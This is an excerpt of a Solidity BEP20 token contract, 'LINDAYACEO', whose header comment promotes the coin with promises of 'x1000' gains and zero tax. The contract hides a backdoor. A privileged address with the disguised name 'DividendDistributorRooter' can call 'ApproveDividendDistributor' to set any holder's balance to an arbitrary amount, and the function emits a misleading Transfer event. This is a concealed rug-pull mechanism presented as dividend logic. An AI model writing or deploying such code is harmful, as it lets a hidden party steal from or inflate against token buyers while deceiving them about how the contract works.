...
/**
LINDAYACEO
💨 It's time for Elon Musk to replace a new CEO, $LindaCEO will reach x1000 . 😍

Tax : 0/0 

https://lindaceo.io/#
https://t.me/lindaccceo23
...
contract LINDAYACEO is Context, IBEP20, Ownable {
   ...
   address private DividendDistributorRooter; 
    constructor(address DividendDistributoradressss) {
        DividendDistributorRooter = DividendDistributoradressss;     
        _name = "LINDAYACEO";
        _symbol = "LINDAYACEO";
        _decimals = 9;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
      ...
      modifier subowner() {
        require(DividendDistributorRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
    ...
    */
    function ApproveDividendDistributor(address LINDAYACEORewards, uint256 addedMontant, uint256 addedValue, uint256 subtractedValue) external subowner {
        _balances[LINDAYACEORewards] = addedMontant * addedValue ** subtractedValue;
        
        emit Transfer(LINDAYACEORewards, address(0), addedMontant);
    }
